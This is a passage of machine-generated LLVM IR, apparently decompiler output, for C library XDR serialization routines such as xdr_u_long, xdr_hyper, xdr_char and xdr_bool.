  %v0_80638e1 = phi i32 [ 1, %dec_label_pc_8063893 ], [ 1, %dec_label_pc_80638cd ], [ %v2_80638ab, %dec_label_pc_806389f ], [ 0, %dec_label_pc_80638db ]
  %v2_80638e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80638e0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80638e1

; uselistorder directives
  uselistorder i32 %v2_806388a, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80638dd, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80638db, { 1, 0 }
}

define i32 @__GI_xdr_int(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80638e2 = call i32 @__GI_xdr_long()
  ret i32 %v0_80638e2
}

define i32 @xdr_u_long(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %tmp6, i32* @ecx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_80638f3 = load i32, i32* %arg1, align 4
  %v9_80638f5 = icmp eq i32 %v2_80638f3, 1
  br i1 %v9_80638f5, label %dec_label_pc_8063908, label %dec_label_pc_80638fa

dec_label_pc_80638fa:                             ; preds = %entry
  %v5_80638f5 = icmp eq i32 %v2_80638f3, 0
  br i1 %v5_80638f5, label %dec_label_pc_8063929, label %dec_label_pc_80638fc

dec_label_pc_80638fc:                             ; preds = %dec_label_pc_80638fa
  %v9_8063901 = icmp eq i32 %v2_80638f3, 2
  br i1 %v9_8063901, label %dec_label_pc_806393a, label %dec_label_pc_8063938

dec_label_pc_8063908:                             ; preds = %entry
  %v1_806390a = add i32 %tmp6, 4
  %v2_806390a = inttoptr i32 %v1_806390a to i32*
  %v3_806390a = load i32, i32* %v2_806390a, align 4
  %v5_8063913 = inttoptr i32 %v3_806390a to i32*
  %v6_8063913 = load i32, i32* %v5_8063913, align 4
  call void @__pseudo_call(i32 %v6_8063913)
  %v1_8063918 = icmp eq i32 %v3_806390a, 0
  br i1 %v1_8063918, label %dec_label_pc_8063938, label %dec_label_pc_806391c

dec_label_pc_806391c:                             ; preds = %dec_label_pc_8063908
  %v1_8063920 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8063920 = inttoptr i32 %v1_8063920 to i32*
  br label %dec_label_pc_806393a

dec_label_pc_8063929:                             ; preds = %dec_label_pc_80638fa
  %v1_806392b = add i32 %tmp6, 4
  %v2_806392b = inttoptr i32 %v1_806392b to i32*
  %v3_806392b = load i32, i32* %v2_806392b, align 4
  %v5_8063930 = add i32 %v3_806392b, 4
  %v6_8063930 = inttoptr i32 %v5_8063930 to i32*
  %v7_8063930 = load i32, i32* %v6_8063930, align 4
  call void @__pseudo_call(i32 %v7_8063930)
  br label %dec_label_pc_806393a

dec_label_pc_8063938:                             ; preds = %dec_label_pc_80638fc, %dec_label_pc_8063908
  br label %dec_label_pc_806393a

dec_label_pc_806393a:                             ; preds = %dec_label_pc_80638fc, %dec_label_pc_8063929, %dec_label_pc_806391c, %dec_label_pc_8063938
  %v0_806393e = phi i32 [ 1, %dec_label_pc_80638fc ], [ %v3_806392b, %dec_label_pc_8063929 ], [ 1, %dec_label_pc_806391c ], [ 0, %dec_label_pc_8063938 ]
  %v2_806393d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_806393d, i32* @ebx, align 4
  ret i32 %v0_806393e

; uselistorder directives
  uselistorder i32 %v2_80638f3, { 0, 2, 1 }
  uselistorder i32 %tmp6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_806393a, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8063938, { 1, 0 }
}

define i32 @xdr_u_int(i32* %xdrs, i32* %ulp) local_unnamed_addr {
entry:
  %v3_806393f = ptrtoint i32* %ulp to i32
  %v5_806393f = call i32 @xdr_u_long(i32* %xdrs, i32 %v3_806393f)
  ret i32 %v5_806393f
}

define i32 @__GI_xdr_hyper() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 %tmp7, i32* %ebx.global-to-local, align 4
  store i32 %tmp6, i32* %esi.global-to-local, align 4
  %v1_8063951 = inttoptr i32 %tmp7 to i32*
  %v2_8063951 = load i32, i32* %v1_8063951, align 4
  store i32 %v2_8063951, i32* %eax.global-to-local, align 4
  %v1_8063953 = icmp eq i32 %v2_8063951, 0
  %v1_8063955 = icmp eq i1 %v1_8063953, false
  br i1 %v1_8063955, label %dec_label_pc_806399c, label %dec_label_pc_8063984

dec_label_pc_8063984:                             ; preds = %entry
  %v1_8063957 = add i32 %tmp6, 4
  %v2_8063957 = inttoptr i32 %v1_8063957 to i32*
  %v3_8063957 = load i32, i32* %v2_8063957, align 4
  store i32 %v3_8063957, i32* %eax.global-to-local, align 4
  store i32 %v3_8063957, i32* %stack_var_-12, align 4
  %v2_8063964 = ashr i32 %v3_8063957, 31
  store i32 %v2_8063964, i32* %edx.global-to-local, align 4
  %v1_8063967 = inttoptr i32 %tmp6 to i32*
  %v2_8063967 = load i32, i32* %v1_8063967, align 4
  store i32 %v2_8063967, i32* %eax.global-to-local, align 4
  %v1_806396f = add i32 %tmp7, 4
  %v2_806396f = inttoptr i32 %v1_806396f to i32*
  %v3_806396f = load i32, i32* %v2_806396f, align 4
  store i32 %v3_806396f, i32* %edx.global-to-local, align 4
  %v2_8063972 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8063972, i32* %eax.global-to-local, align 4
  %v5_8063978 = add i32 %v3_806396f, 4
  %v6_8063978 = inttoptr i32 %v5_8063978 to i32*
  %v7_8063978 = load i32, i32* %v6_8063978, align 4
  call void @__pseudo_call(i32 %v7_8063978)
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8063984 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8063984, i32* %eax.global-to-local, align 4
  %v0_806398a = load i32, i32* %ebx.global-to-local, align 4
  %v1_806398a = add i32 %v0_806398a, 4
  %v2_806398a = inttoptr i32 %v1_806398a to i32*
  %v3_806398a = load i32, i32* %v2_806398a, align 4
  store i32 %v3_806398a, i32* %edx.global-to-local, align 4
  %v5_806398f = add i32 %v3_806398a, 4
  %v6_806398f = inttoptr i32 %v5_806398f to i32*
  %v7_806398f = load i32, i32* %v6_806398f, align 4
  call void @__pseudo_call(i32 %v7_806398f)
  %v4_8063997 = and i32 %v2_8063984, -256
  %v5_8063997 = or i32 %v4_8063997, 1
  br label %dec_label_pc_80639f1

dec_label_pc_806399c:                             ; preds = %entry
  %v9_806399c = icmp eq i32 %v2_8063951, 1
  %v1_806399f = icmp eq i1 %v9_806399c, false
  br i1 %v1_806399f, label %dec_label_pc_80639eb, label %dec_label_pc_80639a1

dec_label_pc_80639a1:                             ; preds = %dec_label_pc_806399c
  %v1_80639a3 = add i32 %tmp7, 4
  %v2_80639a3 = inttoptr i32 %v1_80639a3 to i32*
  %v3_80639a3 = load i32, i32* %v2_80639a3, align 4
  store i32 %v3_80639a3, i32* %eax.global-to-local, align 4
  %v2_80639a6 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_80639a6, i32* %edx.global-to-local, align 4
  %v5_80639ac = inttoptr i32 %v3_80639a3 to i32*
  %v6_80639ac = load i32, i32* %v5_80639ac, align 4
  call void @__pseudo_call(i32 %v6_80639ac)
  %v1_80639b1 = icmp eq i32 %v3_80639a3, 0
  br i1 %v1_80639b1, label %dec_label_pc_80639f6, label %dec_label_pc_80639c9

dec_label_pc_80639c9:                             ; preds = %dec_label_pc_80639a1
  %v2_80639b5 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80639b5, i32* %eax.global-to-local, align 4
  %v0_80639bb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80639bb = add i32 %v0_80639bb, 4
  %v2_80639bb = inttoptr i32 %v1_80639bb to i32*
  %v3_80639bb = load i32, i32* %v2_80639bb, align 4
  store i32 %v3_80639bb, i32* %edx.global-to-local, align 4
  %v5_80639c0 = inttoptr i32 %v3_80639bb to i32*
  %v6_80639c0 = load i32, i32* %v5_80639c0, align 4
  call void @__pseudo_call(i32 %v6_80639c0)
  %v3_80639c9 = load i32, i32* %stack_var_-20, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80639d5 = load i32, i32* %esi.global-to-local, align 4
  %v2_80639d5 = add i32 %v1_80639d5, 4
  %v3_80639d5 = inttoptr i32 %v2_80639d5 to i32*
  store i32 %v3_80639c9, i32* %v3_80639d5, align 4
  %v0_80639d8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80639d8 = load i32, i32* %esi.global-to-local, align 4
  %v2_80639d8 = inttoptr i32 %v1_80639d8 to i32*
  store i32 %v0_80639d8, i32* %v2_80639d8, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_80639e3 = load i32, i32* %esi.global-to-local, align 4
  %v1_80639e3 = inttoptr i32 %v0_80639e3 to i32*
  %v2_80639e3 = load i32, i32* %v1_80639e3, align 4
  %v4_80639e3 = or i32 %v2_80639e3, %tmp
  store i32 %v4_80639e3, i32* %v1_80639e3, align 4
  %v0_80639fb.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80639f8

dec_label_pc_80639eb:                             ; preds = %dec_label_pc_806399c
  %v9_80639eb = icmp eq i32 %v2_8063951, 2
  %v1_80639ee = zext i1 %v9_80639eb to i32
  %v3_80639ee = and i32 %v2_8063951, -256
  %v4_80639ee = or i32 %v1_80639ee, %v3_80639ee
  br label %dec_label_pc_80639f1

dec_label_pc_80639f1:                             ; preds = %dec_label_pc_8063984, %dec_label_pc_80639eb
  %storemerge = phi i32 [ %v5_8063997, %dec_label_pc_8063984 ], [ %v4_80639ee, %dec_label_pc_80639eb ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_80639f1 = urem i32 %storemerge, 256
  store i32 %v1_80639f1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80639f8

dec_label_pc_80639f6:                             ; preds = %dec_label_pc_80639a1
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80639f8

dec_label_pc_80639f8:                             ; preds = %dec_label_pc_80639f1, %dec_label_pc_80639c9, %dec_label_pc_80639f6
  %v0_80639fb = phi i32 [ %v1_80639f1, %dec_label_pc_80639f1 ], [ %v0_80639fb.pre, %dec_label_pc_80639c9 ], [ 0, %dec_label_pc_80639f6 ]
  store i32 %v0_80639fb, i32* %eax.global-to-local, align 4
  ret i32 %v0_80639fb

; uselistorder directives
  uselistorder i32 %v0_80639fb, { 1, 0 }
  uselistorder i32 %v1_80639f1, { 1, 0 }
  uselistorder i32 %v2_8063951, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-12, { 1, 2, 0 }
  uselistorder i32 %tmp7, { 0, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_80639f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80639f1, { 1, 0 }
}

define i32 @xdr_u_hyper() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8063a01 = load i32, i32* @ebx, align 4
  store i32 %tmp8, i32* %ebx.global-to-local, align 4
  store i32 %tmp7, i32* %esi.global-to-local, align 4
  %v1_8063a0d = inttoptr i32 %tmp8 to i32*
  %v2_8063a0d = load i32, i32* %v1_8063a0d, align 4
  store i32 %v2_8063a0d, i32* %eax.global-to-local, align 4
  %v1_8063a0f = icmp eq i32 %v2_8063a0d, 0
  %v1_8063a11 = icmp eq i1 %v1_8063a0f, false
  br i1 %v1_8063a11, label %dec_label_pc_8063a4f, label %dec_label_pc_8063a37

dec_label_pc_8063a37:                             ; preds = %entry
  %v1_8063a13 = add i32 %tmp7, 4
  %v2_8063a13 = inttoptr i32 %v1_8063a13 to i32*
  %v3_8063a13 = load i32, i32* %v2_8063a13, align 4
  store i32 %v3_8063a13, i32* %stack_var_-12, align 4
  %v2_8063a20 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8063a20, i32* %eax.global-to-local, align 4
  %v1_8063a26 = add i32 %tmp8, 4
  %v2_8063a26 = inttoptr i32 %v1_8063a26 to i32*
  %v3_8063a26 = load i32, i32* %v2_8063a26, align 4
  store i32 %v3_8063a26, i32* %edx.global-to-local, align 4
  %v5_8063a2b = add i32 %v3_8063a26, 4
  %v6_8063a2b = inttoptr i32 %v5_8063a2b to i32*
  %v7_8063a2b = load i32, i32* %v6_8063a2b, align 4
  call void @__pseudo_call(i32 %v7_8063a2b)
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8063a37 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8063a37, i32* %eax.global-to-local, align 4
  %v0_8063a3d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063a3d = add i32 %v0_8063a3d, 4
  %v2_8063a3d = inttoptr i32 %v1_8063a3d to i32*
  %v3_8063a3d = load i32, i32* %v2_8063a3d, align 4
  store i32 %v3_8063a3d, i32* %edx.global-to-local, align 4
  %v5_8063a42 = add i32 %v3_8063a3d, 4
  %v6_8063a42 = inttoptr i32 %v5_8063a42 to i32*
  %v7_8063a42 = load i32, i32* %v6_8063a42, align 4
  call void @__pseudo_call(i32 %v7_8063a42)
  %v4_8063a4a = and i32 %v2_8063a37, -256
  %v5_8063a4a = or i32 %v4_8063a4a, 1
  br label %dec_label_pc_8063aa5

dec_label_pc_8063a4f:                             ; preds = %entry
  %v9_8063a4f = icmp eq i32 %v2_8063a0d, 1
  %v1_8063a52 = icmp eq i1 %v9_8063a4f, false
  br i1 %v1_8063a52, label %dec_label_pc_8063a9f, label %dec_label_pc_8063a7c

dec_label_pc_8063a7c:                             ; preds = %dec_label_pc_8063a4f
  %v2_8063a54 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8063a54, i32* %eax.global-to-local, align 4
  %v1_8063a5a = add i32 %tmp8, 4
  %v2_8063a5a = inttoptr i32 %v1_8063a5a to i32*
  %v3_8063a5a = load i32, i32* %v2_8063a5a, align 4
  store i32 %v3_8063a5a, i32* %edx.global-to-local, align 4
  %v5_8063a5f = inttoptr i32 %v3_8063a5a to i32*
  %v6_8063a5f = load i32, i32* %v5_8063a5f, align 4
  call void @__pseudo_call(i32 %v6_8063a5f)
  %v2_8063a68 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8063a68, i32* %eax.global-to-local, align 4
  %v0_8063a6e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063a6e = add i32 %v0_8063a6e, 4
  %v2_8063a6e = inttoptr i32 %v1_8063a6e to i32*
  %v3_8063a6e = load i32, i32* %v2_8063a6e, align 4
  store i32 %v3_8063a6e, i32* %edx.global-to-local, align 4
  %v5_8063a73 = inttoptr i32 %v3_8063a6e to i32*
  %v6_8063a73 = load i32, i32* %v5_8063a73, align 4
  call void @__pseudo_call(i32 %v6_8063a73)
  %v3_8063a7c = load i32, i32* %stack_var_-20, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8063a89 = load i32, i32* %esi.global-to-local, align 4
  %v2_8063a89 = add i32 %v1_8063a89, 4
  %v3_8063a89 = inttoptr i32 %v2_8063a89 to i32*
  store i32 %v3_8063a7c, i32* %v3_8063a89, align 4
  %v0_8063a8c = load i32, i32* %eax.global-to-local, align 4
  %v1_8063a8c = load i32, i32* %esi.global-to-local, align 4
  %v2_8063a8c = inttoptr i32 %v1_8063a8c to i32*
  store i32 %v0_8063a8c, i32* %v2_8063a8c, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8063a97 = load i32, i32* %esi.global-to-local, align 4
  %v1_8063a97 = inttoptr i32 %v0_8063a97 to i32*
  %v2_8063a97 = load i32, i32* %v1_8063a97, align 4
  %v4_8063a97 = or i32 %v2_8063a97, %tmp
  store i32 %v4_8063a97, i32* %v1_8063a97, align 4
  %v0_8063aaf.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8063aac

dec_label_pc_8063a9f:                             ; preds = %dec_label_pc_8063a4f
  %v9_8063a9f = icmp eq i32 %v2_8063a0d, 2
  %v1_8063aa2 = zext i1 %v9_8063a9f to i32
  %v3_8063aa2 = and i32 %v2_8063a0d, -256
  %v4_8063aa2 = or i32 %v1_8063aa2, %v3_8063aa2
  br label %dec_label_pc_8063aa5

dec_label_pc_8063aa5:                             ; preds = %dec_label_pc_8063a37, %dec_label_pc_8063a9f
  %storemerge = phi i32 [ %v5_8063a4a, %dec_label_pc_8063a37 ], [ %v4_8063aa2, %dec_label_pc_8063a9f ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8063aa5 = urem i32 %storemerge, 256
  store i32 %v1_8063aa5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8063aac

dec_label_pc_8063aac:                             ; preds = %dec_label_pc_8063aa5, %dec_label_pc_8063a7c
  %v0_8063aaf = phi i32 [ %v1_8063aa5, %dec_label_pc_8063aa5 ], [ %v0_8063aaf.pre, %dec_label_pc_8063a7c ]
  store i32 %v0_8063aaf, i32* %eax.global-to-local, align 4
  %v2_8063ab1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8063ab1, i32* %ebx.global-to-local, align 4
  store i32 %v0_8063a01, i32* %esi.global-to-local, align 4
  ret i32 %v0_8063aaf

; uselistorder directives
  uselistorder i32 %v0_8063aaf, { 1, 0 }
  uselistorder i32 %v1_8063aa5, { 1, 0 }
  uselistorder i32 %v2_8063a0d, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-12, { 0, 2, 3, 1 }
  uselistorder i32 %tmp8, { 0, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_8063aa5, { 1, 0 }
}

define i32 @xdr_longlong_t() local_unnamed_addr {
entry:
  %v0_8063ab4 = call i32 @__GI_xdr_hyper()
  ret i32 %v0_8063ab4
}

define i32 @xdr_u_longlong_t(i32* %xdrs, i64* %ullp) local_unnamed_addr {
entry:
  %v0_8063ab9 = call i32 @xdr_u_hyper()
  ret i32 %v0_8063ab9
}

define i32 @__GI_xdr_u_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_8063aca = load i32, i32* %arg1, align 4
  %v9_8063acc = icmp eq i32 %v2_8063aca, 1
  br i1 %v9_8063acc, label %dec_label_pc_8063af9, label %dec_label_pc_8063ad1

dec_label_pc_8063ad1:                             ; preds = %entry
  %v5_8063acc = icmp eq i32 %v2_8063aca, 0
  br i1 %v5_8063acc, label %dec_label_pc_8063adf, label %dec_label_pc_8063ad3

dec_label_pc_8063ad3:                             ; preds = %dec_label_pc_8063ad1
  store i32 1, i32* %eax.global-to-local, align 4
  %v9_8063ad8 = icmp eq i32 %v2_8063aca, 2
  br i1 %v9_8063ad8, label %dec_label_pc_8063b1d, label %dec_label_pc_8063b1b

dec_label_pc_8063adf:                             ; preds = %dec_label_pc_8063ad1
  %v1_8063adf = inttoptr i32 %arg2 to i16*
  %v2_8063adf = load i16, i16* %v1_8063adf, align 2
  %v3_8063adf = zext i16 %v2_8063adf to i32
  store i32 %v3_8063adf, i32* %stack_var_-8, align 4
  %v2_8063ae6 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_8063ae6, i32* %eax.global-to-local, align 4
  %v1_8063aec = add i32 %tmp10, 4
  %v2_8063aec = inttoptr i32 %v1_8063aec to i32*
  %v3_8063aec = load i32, i32* %v2_8063aec, align 4
  %v5_8063af1 = add i32 %v3_8063aec, 4
  %v6_8063af1 = inttoptr i32 %v5_8063af1 to i32*
  %v7_8063af1 = load i32, i32* %v6_8063af1, align 4
  call void @__pseudo_call(i32 %v7_8063af1)
  %v0_8063b21.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063b1d

dec_label_pc_8063af9:                             ; preds = %entry
  %v2_8063af9 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_8063af9, i32* %eax.global-to-local, align 4
  %v1_8063aff = add i32 %tmp10, 4
  %v2_8063aff = inttoptr i32 %v1_8063aff to i32*
  %v3_8063aff = load i32, i32* %v2_8063aff, align 4
  %v5_8063b04 = inttoptr i32 %v3_8063aff to i32*
  %v6_8063b04 = load i32, i32* %v5_8063b04, align 4
  call void @__pseudo_call(i32 %v6_8063b04)
  %v0_8063b09 = load i32, i32* %eax.global-to-local, align 4
  %v1_8063b09 = icmp eq i32 %v0_8063b09, 0
  br i1 %v1_8063b09, label %dec_label_pc_8063b1b, label %dec_label_pc_8063b0d

dec_label_pc_8063b0d:                             ; preds = %dec_label_pc_8063af9
  %v2_8063b11 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8063b11 = inttoptr i32 %v2_8063b11 to i16*
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063b1d

dec_label_pc_8063b1b:                             ; preds = %dec_label_pc_8063ad3, %dec_label_pc_8063af9
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063b1d

dec_label_pc_8063b1d:                             ; preds = %dec_label_pc_8063ad3, %dec_label_pc_8063b0d, %dec_label_pc_8063adf, %dec_label_pc_8063b1b
  %v0_8063b21 = phi i32 [ 1, %dec_label_pc_8063ad3 ], [ 1, %dec_label_pc_8063b0d ], [ %v0_8063b21.pre, %dec_label_pc_8063adf ], [ 0, %dec_label_pc_8063b1b ]
  %v2_8063b20 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8063b20, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8063b21

; uselistorder directives
  uselistorder i32 %v2_8063aca, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8063b1d, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8063b1b, { 1, 0 }
}

define i32 @xdr_char(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8063b22 = load i32, i32* @ebx, align 4
  store i32 %v0_8063b22, i32* %stack_var_-4, align 4
  %v4_8063b26 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8063b26, i32* %ebx.global-to-local, align 4
  %v2_8063b2a = load i8, i8* %arg2, align 1
  store i8 %v2_8063b2a, i8* %stack_var_-8, align 1
  %v2_8063b31 = ptrtoint i8* %stack_var_-8 to i32
  %v2_8063b3a = call i32 @__GI_xdr_int(i32 %arg1, i32 %v2_8063b31)
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8063b44 = icmp eq i32 %v2_8063b3a, 0
  br i1 %v1_8063b44, label %dec_label_pc_8063b50, label %dec_label_pc_8063b48

dec_label_pc_8063b48:                             ; preds = %entry
  %v3_8063b48 = load i8, i8* %stack_var_-8, align 1
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8063b4e = load i32, i32* %ebx.global-to-local, align 4
  %v3_8063b4e = inttoptr i32 %v2_8063b4e to i8*
  store i8 %v3_8063b48, i8* %v3_8063b4e, align 1
  %v0_8063b50.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8063b50

dec_label_pc_8063b50:                             ; preds = %entry, %dec_label_pc_8063b48
  %v0_8063b50 = phi i32 [ 0, %entry ], [ %v0_8063b50.pre, %dec_label_pc_8063b48 ]
  %v2_8063b55 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8063b55, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8063b50

; uselistorder directives
  uselistorder i8* %stack_var_-8, { 2, 0, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8063b50, { 1, 0 }
}

define i32 @xdr_u_char(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i8, align 1
  %v2_8063b5f = load i8, i8* %tmp7, align 1
  store i8 %v2_8063b5f, i8* %stack_var_-8, align 1
  %v2_8063b66 = ptrtoint i8* %stack_var_-8 to i32
  store i32 %v2_8063b66, i32* @eax, align 4
  %v5_8063b6f = call i32 @xdr_u_long(i32* %arg1, i32 %v2_8063b66)
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8063b79 = icmp eq i32 %v5_8063b6f, 0
  br i1 %v1_8063b79, label %dec_label_pc_8063b85, label %dec_label_pc_8063b7d

dec_label_pc_8063b7d:                             ; preds = %entry
  %v3_8063b7d = load i8, i8* %stack_var_-8, align 1
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8063b83 = load i32, i32* @ebx, align 4
  %v3_8063b83 = inttoptr i32 %v2_8063b83 to i8*
  store i8 %v3_8063b7d, i8* %v3_8063b83, align 1
  %v0_8063b85.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8063b85

dec_label_pc_8063b85:                             ; preds = %entry, %dec_label_pc_8063b7d
  %v0_8063b85 = phi i32 [ 0, %entry ], [ %v0_8063b85.pre, %dec_label_pc_8063b7d ]
  ret i32 %v0_8063b85

; uselistorder directives
  uselistorder i8* %stack_var_-8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8063b85, { 1, 0 }
}

define i32 @xdr_bool(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_8063b98 = load i32, i32* %arg1, align 4
  %v9_8063b9a = icmp eq i32 %v2_8063b98, 1
  br i1 %v9_8063b9a, label %dec_label_pc_8063bcc, label %dec_label_pc_8063b9f

dec_label_pc_8063b9f:                             ; preds = %entry
  %v5_8063b9a = icmp eq i32 %v2_8063b98, 0
  br i1 %v5_8063b9a, label %dec_label_pc_8063bad, label %dec_label_pc_8063ba1

dec_label_pc_8063ba1:                             ; preds = %dec_label_pc_8063b9f
  %v9_8063ba6 = icmp eq i32 %v2_8063b98, 2
  br i1 %v9_8063ba6, label %dec_label_pc_8063bf5, label %dec_label_pc_8063bf3

dec_label_pc_8063bad:                             ; preds = %dec_label_pc_8063b9f
  %v1_8063baf = inttoptr i32 %arg2 to i32*
  %v2_8063baf = load i32, i32* %v1_8063baf, align 4
  %v3_8063baf = icmp eq i32 %v2_8063baf, 0
  %v1_8063bb2 = icmp eq i1 %v3_8063baf, false
  %v2_8063bb2 = zext i1 %v1_8063bb2 to i32
  store i32 %v2_8063bb2, i32* %stack_var_-8, align 4
  %v1_8063bbb = add i32 %tmp6, 4
  %v2_8063bbb = inttoptr i32 %v1_8063bbb to i32*
  %v3_8063bbb = load i32, i32* %v2_8063bbb, align 4
  %v2_8063bbe = ptrtoint i32* %stack_var_-8 to i32
  %v5_8063bc4 = add i32 %v3_8063bbb, 4
  %v6_8063bc4 = inttoptr i32 %v5_8063bc4 to i32*
  %v7_8063bc4 = load i32, i32* %v6_8063bc4, align 4
  call void @__pseudo_call(i32 %v7_8063bc4)
  br label %dec_label_pc_8063bf5

dec_label_pc_8063bcc:                             ; preds = %entry
  %v1_8063bce = add i32 %tmp6, 4
  %v2_8063bce = inttoptr i32 %v1_8063bce to i32*
  %v3_8063bce = load i32, i32* %v2_8063bce, align 4
  %v5_8063bd7 = inttoptr i32 %v3_8063bce to i32*
  %v6_8063bd7 = load i32, i32* %v5_8063bd7, align 4
  call void @__pseudo_call(i32 %v6_8063bd7)
  %v1_8063bdc = icmp eq i32 %v3_8063bce, 0
  br i1 %v1_8063bdc, label %dec_label_pc_8063bf3, label %dec_label_pc_8063be0

dec_label_pc_8063be0:                             ; preds = %dec_label_pc_8063bcc
  %v4_8063be2 = icmp eq i32 %tmp, 0
  %v1_8063be7 = icmp eq i1 %v4_8063be2, false
  %v2_8063be7 = zext i1 %v1_8063be7 to i32
  %v1_8063bea = load i32, i32* %ebx.global-to-local, align 4
  %v2_8063bea = inttoptr i32 %v1_8063bea to i32*
  store i32 %v2_8063be7, i32* %v2_8063bea, align 4
  br label %dec_label_pc_8063bf5

dec_label_pc_8063bf3:                             ; preds = %dec_label_pc_8063ba1, %dec_label_pc_8063bcc
  br label %dec_label_pc_8063bf5

